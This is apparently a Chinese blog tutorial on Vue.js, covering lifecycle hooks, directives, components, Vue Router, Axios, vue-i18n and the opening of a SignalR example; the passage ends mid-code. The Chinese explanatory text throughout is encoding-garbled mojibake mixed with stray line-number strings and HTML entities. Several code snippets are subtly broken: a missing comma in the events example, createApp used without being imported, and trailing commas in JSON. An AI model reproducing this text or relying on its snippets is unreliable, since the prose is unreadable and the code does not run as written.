æ•°æ®æ›´æ–°æ—¶è°ƒç”¨ updated &#x2F;&#x2F;ç»„ä»¶ DOM å·²ç»æ›´æ–°, ç»„ä»¶æ›´æ–°å®Œæ¯• æ³¨æ„ï¼šç”Ÿå‘½å‘¨æœŸä¸èƒ½ç”¨ç®­å¤´å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;div id=&quot;app&quot;&gt; &#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; msg : &quot;hi vue&quot;, &#125;, beforeCreate:function()&#123; console.log(&#x27;beforeCreate&#x27;); &#125;, created :function()&#123; console.log(&#x27;created&#x27;); &#125;, beforeMount : function()&#123; console.log(&#x27;beforeMount&#x27;); &#125;, mounted : function()&#123; console.log(&#x27;mounted&#x27;); &#125;, beforeUpdate : function()&#123; console.log(&#x27;beforeUpdate&#x27;); &#125;, updated : function()&#123; console.log(&#x27;updated&#x27;); &#125;&#125;);setTimeout(function()&#123; vm.msg = &quot;change msg&quot;; console.log(&quot;change msg&quot;);&#125;, 10000);â€‹ â€‹â€‹ ç”Ÿå‘½å‘¨æœŸé€‰é¡¹Vue.js &#x3D;&gt; https://cn.vuejs.org/api/options-lifecycle.html 4.æ¨¡æ¿è¯­æ³•v-bind v-html jsè¡¨è¾¾å¼ 1234567891011121314151617181920212223242526272829303132 &lt;p&gt;&#123;&#123; number + 1 &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; 1 == 1 ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/p&gt;&lt;div id=&quot;app&quot;&gt; &#123;&#123;msg&#125;&#125; &lt;p&gt;Using mustaches: &#123;&#123; rawHtml &#125;&#125;&lt;/p&gt; &lt;p v-html=&quot;rawHtml&quot;&gt;&lt;/p&gt; &lt;div v-bind:class=&quot;color&quot;&gt;test...&lt;/div&gt; &lt;p&gt;&#123;&#123; number + 1 &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; 1 == 1 ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; msg : &quot;hi vue&quot;, rawHtml : &#x27;&lt;span style=&quot;color:red&quot;&gt;this is should be red&lt;/span&gt;&#x27;, color:&#x27;blue&#x27;, number : 10, ok : 1, message : &quot;vue&quot; &#125;&#125;);vm.msg = &quot;hi....&quot;;&lt;/script&gt; &lt;style type=&quot;text/css&quot;&gt;.red&#123;color:red;&#125;.blue&#123;color:blue; font-size:14px;&#125;&lt;/style&gt; â€‹â€‹ v-if @clikck @click.stop stopä¿®é¥° è¡¨ç¤ºåªæ‰§è¡Œclick2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166&lt;div id=&quot;app&quot;&gt; &lt;p v-if=&quot;seen&quot;&gt;HIHI&lt;/p&gt; &lt;a v-bind:href=&quot;url&quot;&gt;...&lt;/a&gt; &lt;div @click=&quot;click1&quot; &gt; &lt;div @click.stop=&quot;click2&quot;&gt; click me &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; seen : false, url : &quot;HTTPS://WWW.BAIDU.COM&quot; &#125;, methods:&#123; click1 : function () &#123; console.log(&#x27;click1......&#x27;); &#125;, click2 : function () &#123; console.log(&#x27;click2......&#x27;); &#125; &#125;&#125;);&lt;/script&gt;â€‹```â€‹â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041749.jpg&quot; &gt;## 5.å¯¹è±¡è¯­æ³•class styleç»‘å®š``` html&lt;div id=&quot;app&quot;&gt; &lt;div class=&quot;test&quot; v-bind:class=&quot;[ isActive ? &#x27;active&#x27; : &#x27;&#x27;, isGreen ? &#x27;green&#x27; : &#x27;&#x27;]&quot; style=&quot;width:200px; height:200px; text-align:center; line-height:200px;&quot;&gt; hahaha &lt;/div&gt; &lt;div :style=&quot;&#123;color:color, fontSize:size, background: isBlue ? &#x27;blue&#x27; : &#x27;&#x27;&#125;&quot;&gt; hihihihi &lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; isActive : true, isGreen : true, color : &quot;#111111&quot;, size : &#x27;50px&#x27;, isRed : true, isBlue:true &#125;&#125;);&lt;/script&gt;&lt;style&gt;.test&#123;font-size:30px;&#125;.green&#123;color:#00FF00;&#125;.active&#123;background:gray;&#125;&lt;/style&gt;â€‹```[2024041750]## 6.æ¡ä»¶æ¸²æŸ“v-if v-show ``` javascript&lt;div id=&quot;app&quot;&gt; &lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt; &lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt; &lt;h1 v-show=&quot;nok&quot;&gt;Hello!&lt;/h1&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; type : &quot;D&quot;, ok : true//ok : false &#125;&#125;);&lt;/script&gt;â€‹```â€‹â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041751.jpg&quot; &gt;å¦‚æœéœ€è¦é¢‘ç¹åˆ‡æ¢ ï¼Œç”¨v-show showæœ‰å†™å…¥dom## 7.åˆ—è¡¨æ¸²æŸ“v-for ``` javascript&lt;div id=&quot;app&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;item,index in items&quot; :key=&quot;index&quot;&gt; &#123;&#123;index + 1 &#125;&#125; &#123;&#123; item.message &#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;ul&gt; &lt;li v-for=&quot;value, key in object&quot;&gt; &#123;&#123;key&#125;&#125; : &#123;&#123; value &#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; items : [ &#123; message: &#x27;zhangsan&#x27; &#125;, &#123; message: &#x27;liwu&#x27; &#125; ], object: &#123; title: &#x27;tt&#x27;, author: &#x27;zhangsan&#x27;, createAt: &#x27;2024-01-01&#x27; &#125; &#125;&#125;);&lt;/script&gt;â€‹```â€‹â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041752.jpg&quot; &gt;## 8.äº‹ä»¶ ``` html &lt;div id=&quot;app&quot;&gt; &lt;div id=&quot;example-1&quot;&gt; &lt;button v-on:click=&quot;counter+=1&quot;&gt;æ•°å€¼: &#123;&#123; counter &#125;&#125;&lt;/button&gt;&lt;br /&gt; &lt;button v-on:click=&quot;greet(&#x27;abc&#x27;)&quot;&gt;Greet&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var vm = new Vue(&#123; el :&quot;#app&quot; data :&#123; counter:0, name :&quot;vue&quot; &#125;, methods:&#123; greet :function(str,e)&#123; alert(&#x27;hi&#x27;); alert(this.name);&#125; &#125;); &lt;/script&gt; â€‹â€‹ 9.è¡¨å•ç»‘å®š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;div id=&quot;app&quot;&gt; &lt;div id=&quot;example-1&quot;&gt; &lt;input v-model=&quot;message&quot; placeholder=&quot;edit me&quot;&gt; &lt;p&gt;Message is: &#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;textarea v-model=&quot;message2&quot; placeholder=&quot;add multiple lines&quot;&gt;&lt;/textarea&gt; &lt;p style=&quot;white-space: pre-line;&quot;&gt;&#123;&#123; message2 &#125;&#125;&lt;/p&gt; &lt;br /&gt; &lt;div style=&quot;margin-top:20px;&quot;&gt; &lt;input type=&quot;checkbox&quot; id=&quot;z&quot; value=&quot;z&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;z&quot;&gt;z&lt;/label&gt; &lt;input type=&quot;checkbox&quot; id=&quot;x&quot; value=&quot;x&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;x&quot;&gt;x&lt;/label&gt; &lt;input type=&quot;checkbox&quot; id=&quot;a&quot; value=&quot;a&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;a&quot;&gt;a&lt;/label&gt; &lt;br&gt; &lt;span&gt;Checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;div style=&quot;margin-top:20px;&quot;&gt; &lt;input type=&quot;radio&quot; id=&quot;one&quot; value=&quot;One&quot; v-model=&quot;picked&quot;&gt; &lt;label for=&quot;one&quot;&gt;One&lt;/label&gt; &lt;br&gt; &lt;input type=&quot;radio&quot; id=&quot;two&quot; value=&quot;Two&quot; v-model=&quot;picked&quot;&gt; &lt;label for=&quot;two&quot;&gt;Two&lt;/label&gt; &lt;br&gt; &lt;span&gt;Picked: &#123;&#123; picked &#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;button type=&quot;button&quot; @click=&quot;submit&quot;&gt;æäº¤&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; message : &quot;himsg&quot;, message2 :&quot;himsg2&quot;, checkedNames : [&#x27;a&#x27;, &#x27;z&#x27;], picked : &quot;Two&quot; &#125;, methods: &#123; submit : function () &#123; console.log(this.message + &quot; &quot;+this.message2 ); &#125; &#125;&#125;);&lt;/script&gt;â€‹```â€‹â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041754.jpg&quot; &gt;## 10.ç»„ä»¶åŸºç¡€ ``` javascript&lt;div id=&quot;app&quot;&gt; &lt;button-counter title=&quot;123&quot;&gt;&lt;/button-counter&gt; &lt;button-counter title=&quot;title1 &quot; @clicknow=&quot;clicknow&quot;&gt; &lt;h3&gt;hi...h3&lt;/h3&gt; &lt;/button-counter&gt; &lt;button-counter title=&quot;title2 : &quot;&gt;&lt;/button-counter&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; Vue.component(&#x27;button-counter&#x27;, &#123; props: [&#x27;title&#x27;], data: function() &#123; return &#123; count: 0 &#125; &#125;, template: &#x27;&lt;div&gt;&lt;h1&gt;hi...&lt;/h1&gt;&lt;button v-on:click=&quot;clickfun&quot;&gt;&#123;&#123;title&#125;&#125; You clicked me &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&#x27;, methods: &#123; clickfun: function() &#123; this.count++; this.$emit(&#x27;clicknow&#x27;, this.count);//ä¼ å‡ºå» &#125; &#125; &#125;) var vm = new Vue(&#123; el: &quot;#app&quot;, data: &#123; &#125;, methods: &#123; clicknow: function(e) &#123; console.log(e); &#125;, &#125; &#125;); &lt;/script&gt; component(â€˜xxxâ€™,{}) xxxç»„ä»¶åç§° {}å¯¹è±¡å†…å®¹ props:[â€œtitleâ€]å®šä¹‰å±æ€§ æ’æ§½ å¯æ’å…¥htmlæ ‡ç­¾ 12345678910111213141516171819202122232425262728&lt;script type=&quot;text/javascript&quot;&gt;Vue.component(&#x27;button-counter&#x27;, &#123; props: [&#x27;title&#x27;], data: function () &#123; return &#123;&#125; &#125;, template: &#x27;&lt;div&gt;&lt;h1&gt;hi...&lt;/h1&gt;&lt;/div&gt;&#x27;, methods:&#123; &#125;&#125;)var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; &#125;, methods:&#123; clicknow : function (e) &#123; console.log(e); &#125; &#125;, components:&#123; test : &#123; template:&quot;&lt;h2&gt;h2...&lt;/h2&gt;&quot; &#125; &#125;&#125;);&lt;/script&gt; Vue.component(â€˜button-counterâ€™â€¦æ˜¯å…¨å±€æ³¨å†Œ components:{â€¦ } å±€éƒ¨æ³¨å†Œ 11.å•æ–‡ä»¶ç»„ä»¶â€‹â€‹ 123456789101112131415161718192021222324&lt;template&gt; &lt;div&gt; &lt;h1&gt;Hello, Vue!&lt;/h1&gt; &lt;HelloWorld /&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;// å¼•å…¥ HelloWorld ç»„ä»¶import HelloWorld from &#x27;./HelloWorld.vue&#x27;; export default &#123; name: &#x27;App&#x27;, components: &#123; // æ³¨å†Œå¼•å…¥çš„ç»„ä»¶ HelloWorld &#125;&#125;&lt;/script&gt; &lt;style&gt;/* æ ·å¼ */&lt;/style&gt; ğŸŒ±Vueç»„ä»¶å­¦ä¹ Vue RouterVue Router æ˜¯ Vue.js å®˜æ–¹çš„è·¯ç”±ç®¡ç†å™¨ã€‚å®ƒå…è®¸æ„å»ºå•é¡µåº”ç”¨ï¼ˆSPAï¼‰ï¼Œåœ¨ä¸åŒçš„ URL ä¹‹é—´è¿›è¡Œå¯¼èˆªï¼ŒåŒæ—¶è¿˜å¯ä»¥å®ç°è¯¸å¦‚è·¯ç”±å‚æ•°ã€åµŒå¥—è·¯ç”±ã€è·¯ç”±å¯¼èˆªå®ˆå«ç­‰åŠŸèƒ½ã€‚ 1.å®‰è£… Vue Router1npm install vue-router 2.router.jsVue é¡¹ç›®ä¸­ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªè·¯ç”±å®ä¾‹å¹¶å°†å…¶æŒ‚è½½åˆ° Vue å®ä¾‹ä¸Šã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œåä¸º router.js æˆ–è€…ç±»ä¼¼çš„æ–‡ä»¶ä¸­å®šä¹‰è·¯ç”±ï¼Œç„¶ååœ¨ä¸» Vue å®ä¾‹ä¸­å¼•å…¥å®ƒã€‚ 12345678910111213141516171819// router/index.jsimport &#123; createRouter, createWebHistory &#125; from &#x27;vue-router&#x27;import Login from &#x27;../components/Login.vue&#x27;import Setting from &#x27;../components/Setting.vue&#x27;import UserManagement from &#x27;../components/UserManagement.vue&#x27;import imtest from &#x27;../components/WebIMTest.vue&#x27;const routes = [ &#123; path: &#x27;/Login&#x27;, component: Login &#125;, // _ // è®¾ç½®ç©ºé»˜è®¤è·¯ç”±ä¸ºLogin.vue &#123; path: &#x27;/Setting&#x27;, component: Setting &#125;, &#123; path: &#x27;/UserManagement&#x27;, component: UserManagement &#125;, &#123; path: &#x27;/imtest&#x27;, component: imtest &#125;] const router = createRouter(&#123; history: createWebHistory(), routes&#125;) export default router createRouter å‡½æ•°ç”¨äºåˆ›å»ºè·¯ç”±å®ä¾‹ï¼Œè€Œ createWebHistory å‡½æ•°åˆ™ç”¨äºåˆ›å»ºåŸºäº HTML5 History API çš„è·¯ç”±æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨æµè§ˆå™¨çš„ History API æ¥å¤„ç† URL çš„å˜åŒ– 3.å¼•å…¥è·¯ç”±å®ä¾‹Vue å®ä¾‹ä¸­ï¼Œéœ€è¦å¼•å…¥è¿™ä¸ªè·¯ç”±å®ä¾‹ï¼Œå¹¶å°†å…¶åº”ç”¨åˆ° Vue å®ä¾‹ä¸­ã€‚ 123456789101112// main.js import Vue from &#x27;vue&#x27;;import App from &#x27;./App.vue&#x27;;import router from &#x27;./router&#x27;; const app = createApp(App) app.use(router) // ä½¿ç”¨è·¯ç”± app.mount(&#x27;#app&#x27;) 4.è·¯ç”±å¯¼èˆªå¯ä»¥ä½¿ç”¨ æ¥å®ç°è·¯ç”±å¯¼èˆªï¼Œä½¿ç”¨ æ¥æ¸²æŸ“å½“å‰è·¯ç”±åŒ¹é…åˆ°çš„ç»„ä»¶ã€‚ 12345678910111213141516&lt;!-- App.vue --&gt;&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;router-link to=&quot;/login&quot; class=&quot;nav-link&quot;&gt;Login&lt;/router-link&gt; &lt;router-link to=&quot;/setting&quot; class=&quot;nav-link&quot;&gt;Setting&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;export default &#123; name: &#x27;App&#x27;&#125;;&lt;/script&gt; 5.è¿è¡Œå®ä¾‹â€‹â€‹ ç‚¹å‡»Setting åˆ™æ¥åˆ°&#x2F;setting ï¼Œ å±•ç¤ºçš„æ˜¯Settingçš„å†…å®¹ AxiosAxios æ˜¯ä¸€ä¸ªæµè¡Œçš„åŸºäº Promise çš„ HTTP å®¢æˆ·ç«¯ï¼Œç”¨äºæµè§ˆå™¨å’Œ Node.js ç¯å¢ƒã€‚å®ƒå…è®¸ä½ ä»¥ç®€å•ã€ç›´è§‚çš„æ–¹å¼å‘é€å¼‚æ­¥HTTPè¯·æ±‚ï¼Œå¹¶å¤„ç†å“åº”ã€‚Axios å…·æœ‰è®¸å¤šåŠŸèƒ½ï¼ŒåŒ…æ‹¬ï¼š æ”¯æŒ Promise APIï¼šAxiosä½¿ç”¨Promiseå¯¹è±¡è¿›è¡Œå¼‚æ­¥æ“ä½œçš„å¤„ç†ï¼Œä½¿å¾—ä»£ç æ›´åŠ æ¸…æ™°å’Œæ˜“äºç†è§£ã€‚ æ”¯æŒæµè§ˆå™¨å’ŒNode.jsï¼šAxioså¯ä»¥åœ¨æµè§ˆå™¨å’ŒNode.jsç¯å¢ƒä¸­ä½¿ç”¨ï¼Œè¿™ä½¿å¾—å®ƒæˆä¸ºè·¨å¹³å°å¼€å‘çš„ç†æƒ³é€‰æ‹©ã€‚ æ‹¦æˆªè¯·æ±‚å’Œå“åº”ï¼šä½ å¯ä»¥åœ¨å‘é€è¯·æ±‚æˆ–æ¥æ”¶å“åº”æ—¶ï¼Œä½¿ç”¨æ‹¦æˆªå™¨å¯¹è¯·æ±‚æˆ–å“åº”è¿›è¡Œå…¨å±€å¤„ç†ã€‚ è‡ªåŠ¨è½¬æ¢JSONæ•°æ®ï¼šAxiosä¼šè‡ªåŠ¨å°†æ¥æ”¶åˆ°çš„JSONæ•°æ®è½¬æ¢ä¸ºJavaScriptå¯¹è±¡ï¼Œæ–¹ä¾¿åœ¨ä»£ç ä¸­è¿›è¡Œå¤„ç†ã€‚ å–æ¶ˆè¯·æ±‚ï¼šAxioså…è®¸ä½ å–æ¶ˆæœªå®Œæˆçš„HTTPè¯·æ±‚ï¼Œé˜²æ­¢ä¸å¿…è¦çš„ç½‘ç»œè¯·æ±‚ã€‚ å®¢æˆ·ç«¯ç«¯å£æ”¯æŒé˜²æ­¢CSRFï¼šAxioså¯ä»¥è‡ªåŠ¨è¯†åˆ«å’Œå¤„ç†CSRFä¿æŠ¤ã€‚ é”™è¯¯å¤„ç†ï¼šAxiosæä¾›äº†ä¸°å¯Œçš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œæ–¹ä¾¿ä½ å¤„ç†å„ç§ç½‘ç»œè¯·æ±‚å¯èƒ½å‡ºç°çš„é”™è¯¯ã€‚ é€‚ç”¨äºå‰ç«¯å’Œåç«¯å¼€å‘ï¼Œä½¿å¾—å‘é€å’Œå¤„ç†HTTPè¯·æ±‚å˜å¾—æ›´åŠ ç®€å•å’Œé«˜æ•ˆã€‚ 1.å®‰è£…Axioså¯ä»¥é€šè¿‡npmæˆ–è€…yarnè¿›è¡Œå®‰è£…ã€‚ 1npm install axios 2.å¼•å…¥axios 1import axios from &#x27;axios&#x27;; 3.axiosè¯·æ±‚æ–¹æ³• 1234567891011121314151617181920212223242526272829&lt;script&gt;import axios from &#x27;axios&#x27;; export default &#123; methods: &#123; AxiosTest() &#123; const url = &#x27;/api/getLogByID&#x27;; const id = &#x27;3&#x27;; // ä½¿ç”¨Axioså‘é€GETè¯·æ±‚ axios.get(url, &#123; params: &#123; id: id &#125; &#125;) .then(response =&gt; &#123; // è¯·æ±‚æˆåŠŸæ—¶çš„å¤„ç†é€»è¾‘ console.log(response.data); // è¾“å‡ºè·å–åˆ°çš„æ—¥å¿—æ•°æ® &#125;) .catch(error =&gt; &#123; // è¯·æ±‚å¤±è´¥æ—¶çš„å¤„ç†é€»è¾‘ console.error(&#x27;There was an error!&#x27;, error); &#125;);&#125;&#125;;&lt;/script&gt; 4.è°ƒç”¨æ–¹æ³•åœ¨Vueæ¨¡æ¿ä¸­è°ƒç”¨æ–¹æ³•ï¼šé€šè¿‡äº‹ä»¶ç»‘å®šæˆ–å…¶ä»–æ–¹å¼æ¥è°ƒç”¨ä¸Šé¢å®šä¹‰çš„æ–¹æ³•ã€‚ 1&lt;button @click=&quot;AxiosTest&quot;&gt;è·å– &lt;/button&gt; 5.è¿è¡Œå®ä¾‹â€‹â€‹ æˆ·ç‚¹å‡»æŒ‰é’®æ—¶ï¼ŒAxiosTestæ–¹æ³•è¢«è°ƒç”¨ï¼Œå®ƒä¼šä½¿ç”¨Axioså‘é€GETè¯·æ±‚æ¥è°ƒç”¨GetLogByIDæ–¹æ³•ï¼Œå¹¶å¤„ç†è¿”å›çš„æ•°æ®æˆ–é”™è¯¯ã€‚ console.log è¾“å‡º è¿”å›çš„æ•°æ® Vue-i18n å›½é™…åŒ–åœ¨Vueåº”ç”¨ä¸­ä½¿ç”¨Vue I18næ—¶ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š 1.å®‰è£…Vue I18né¦–å…ˆï¼Œéœ€è¦å®‰è£…Vue I18nã€‚å¯ä»¥é€šè¿‡npmæˆ–è€…yarnæ¥å®‰è£…Vue I18n 1npm install vue-i18n or 1yarn add vue-i18n 2.åˆ›å»ºè¯­è¨€æ–‡ä»¶æ¥ä¸‹æ¥ï¼Œåˆ›å»ºè¯­è¨€æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶å¯ä»¥æ˜¯JSONæ ¼å¼çš„ï¼Œç”¨æ¥å­˜å‚¨ä¸åŒè¯­è¨€çš„ç¿»è¯‘ä¿¡æ¯ã€‚ä¾‹å¦‚en.jsonã€zh.jsonå’Œfr.jsonç­‰æ–‡ä»¶ï¼Œåˆ†åˆ«å­˜å‚¨è‹±è¯­ã€ä¸­æ–‡å’Œæ³•è¯­çš„ä¿¡æ¯ã€‚ 123456789101112131415161718192021// en.json&#123; &quot;Welcome&quot;: &quot;Welcome&quot;, &quot;Login&quot;: &quot;Login&quot;, &quot;Setting&quot;: &quot;Setting&quot;, &#125;// en.json&#123; &quot;Welcome&quot;: &quot;Welcome&quot;, &quot;Login&quot;: &quot;Login&quot;, &quot;Setting&quot;: &quot;Setting&quot;, &#125;// zh.json&#123; &quot;Welcome&quot;: &quot;æ¬¢è¿&quot;, &quot;Login&quot;: &quot;ç™»å½•&quot;, &quot;Setting&quot;: &quot;è®¾ç½®&quot;, &#125; 3.åœ¨Vueç»„ä»¶ä¸­ä½¿ç”¨Vue I18n åœ¨Vueç»„ä»¶ä¸­å¼•å…¥Vue I18nï¼Œå¹¶åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚ 123456789101112131415161718192021222324252627282930// main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#123; createI18n &#125; from &#x27;vue-i18n&#x27;import router from &#x27;./router&#x27; // å¼•å…¥è¯­è¨€æ–‡ä»¶import en from &#x27;./locales/en.json&#x27;import zh from &#x27;./locales/zh.json&#x27;import fr from &#x27;./locales/fr.json&#x27; // åˆ›å»º Vue I18n å®ä¾‹const i18n = createI18n(&#123; locale: &#x27;en&#x27;, // é»˜è®¤è¯­è¨€ messages: &#123; en, zh, fr &#125;&#125;) // åˆ›å»º Vue åº”ç”¨å®ä¾‹const app = createApp(App) // ä½¿ç”¨ Vue I18n å’Œè·¯ç”±app.use(i18n)app.use(router) // æŒ‚è½½åº”ç”¨app.mount(&#x27;#app&#x27;) 4.åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ç¿»è¯‘ä½¿ç”¨ $t æ–¹æ³•æ¥è¿›è¡Œç¿»è¯‘ã€‚ 123456789101112131415&lt;!-- HelloWorld.vue --&gt;&lt;template&gt; &lt;div&gt; &lt;h1&gt;&#123;&#123; $t(&#x27;Welcome&#x27;) &#125;&#125;&lt;/h1&gt; &lt;p&gt;&#123;&#123; $t(&#x27;Login&#x27;) &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; $t(&#x27;Setting&#x27;) &#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;export default &#123; &#125;&lt;/script&gt; 5.åˆ‡æ¢è¯­è¨€ï¼š æœ€åï¼Œé€šè¿‡ä¿®æ”¹Vue I18nå®ä¾‹çš„localeå±æ€§æ¥åˆ‡æ¢è¯­è¨€ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// åˆ‡æ¢åˆ°ä¸­æ–‡i18n.global.locale = &#x27;zh&#x27;; // åˆ‡æ¢åˆ°æ³•è¯­i18n.global.locale = &#x27;fr&#x27;;åœ¨2.åˆ›å»ºè¯­è¨€æ–‡ä»¶æ—¶ä¹Ÿå¯ä»¥åªåˆ›å»ºä¸€ä¸ªjsonï¼Œå‡å°‘åç»­ç»´æŠ¤æˆæœ¬å¦‚ï¼š// lan.json&#123; &quot;en&quot;: &#123; &quot;Welcome&quot;: &quot;Welcome&quot;, &quot;Login&quot;: &quot;Login&quot;, &quot;Setting&quot;: &quot;Setting&quot;, &quot;UserManagement&quot;: &quot;User Management&quot; &#125;, &quot;zh&quot;: &#123; &quot;Welcome&quot;: &quot;æ¬¢è¿&quot;, &quot;Login&quot;: &quot;ç™»å½•&quot;, &quot;Setting&quot;: &quot;è®¾ç½®&quot;, &quot;UserManagement&quot;: &quot;ç”¨æˆ·ç®¡ç†&quot; &#125;, &quot;fr&quot;: &#123; &quot;Welcome&quot;: &quot;Bienvenue&quot;, &quot;Login&quot;: &quot;Connexion&quot;, &quot;Setting&quot;: &quot;RÃ©glage&quot;, &quot;UserManagement&quot;: &quot;Gestion des utilisateurs&quot; &#125;, &quot;ru&quot;: &#123; &quot;Welcome&quot;: &quot;Ğ”Ğ¾Ğ±Ñ€Ğ¾ Ğ¿Ğ¾Ğ¶Ğ°Ğ»Ğ¾Ğ²Ğ°Ñ‚ÑŒ&quot;, &quot;Login&quot;: &quot;Ğ’Ğ¾Ğ¹Ñ‚Ğ¸&quot;, &quot;Setting&quot;: &quot;ĞĞ°ÑÑ‚Ñ€Ğ¾Ğ¹ĞºĞ¸&quot;, &quot;UserManagement&quot;: &quot;Ğ£Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¸Ğµ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑĞ¼Ğ¸&quot; &#125;, &quot;hk&quot;: &#123; &quot;Welcome&quot;: &quot;æ­¡è¿&quot;, &quot;Login&quot;: &quot;ç™»éŒ„&quot;, &quot;Setting&quot;: &quot;è¨­ç½®&quot;, &quot;UserManagement&quot;: &quot;ç”¨æˆ¶ç®¡ç†&quot;, &#125; &#125;//main.jsimport translations from &#x27;./lan.json&#x27; // åˆ›å»º Vue I18n å®ä¾‹const i18n = createI18n(&#123; locale: &#x27;en&#x27;, // é»˜è®¤è¯­è¨€ messages: translations&#125;) 5.è¿è¡Œå®ä¾‹â€‹â€‹ â€‹â€‹ Vue-SignalR å®æ—¶é€šè®¯åœ¨Vueåº”ç”¨ä¸­ä½¿ç”¨SignalRï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œ 1.å®‰è£…SignalRå®¢æˆ·ç«¯åº“ é¦–å…ˆï¼Œéœ€è¦å®‰è£…SignalRçš„JavaScriptå®¢æˆ·ç«¯åº“ã€‚å¯ä»¥é€šè¿‡npmæˆ–è€…yarnæ¥å®‰è£…ã€‚ 1npm install @microsoft/signalr or 1yarn add @microsoft/signalr 2.åœ¨Vueç»„ä»¶ä¸­ä½¿ç”¨SignalRåœ¨Vueç»„ä»¶ä¸­å¼•å…¥SignalRåº“ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªSignalRè¿æ¥ï¼Œç„¶åè®¢é˜…æœåŠ¡å™¨å‘é€çš„æ¶ˆæ¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344 &lt;script&gt;import &#123; HubConnectionBuilder &#125; from &#x27;@microsoft/signalr&#x27;; export default &#123; data() &#123; return &#123; messageText: &#x27;&#x27;, hubConnection: null, messages: [] &#125;; &#125;, methods: &#123; sendMessage() &#123; if (!this.messageText) return; // å‘é€æ¶ˆæ¯ç»™SignalR Hub this.hubConnection.invoke(&#x27;SendMessage2&#x27;,&#x27;user1&#x27;, this.messageText) .then(() =&gt; &#123; console.log(&#x27;Message sent: &#x27;, this.messageText); // 